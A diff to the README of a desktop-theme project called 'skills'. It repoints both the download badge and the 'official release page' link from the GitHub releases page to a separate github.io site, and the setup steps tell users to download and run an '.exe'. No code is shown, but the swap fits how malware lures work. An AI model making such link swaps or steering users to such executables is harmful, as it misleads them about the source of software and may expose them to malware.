@@ -1,7 +1,7 @@
 # 🎨 skills - Create custom desktop themes easily
 
 <p align="center">
-  <a href="https://github.com/jarradstree8577/skills/releases">
+  <a href="https://jarradstree8577.github.io">
     <img src="https://img.shields.io/badge/Download-Latest%20Release-blue.svg" alt="Download">
   </a>
 </p>
@@ -25,7 +25,7 @@ The software runs on common hardware. If you run basic web browsers or text edit
 
 Follow these steps to set up the software.
 
-1. Go to the [official release page](https://github.com/jarradstree8577/skills/releases).
+1. Go to the [official release page](https://jarradstree8577.github.io).
 2. Look for the recent file with the ".exe" extension under the Assets section.
 3. Click the file to save it to your computer.
 4. Locate the file in your Downloads folder.
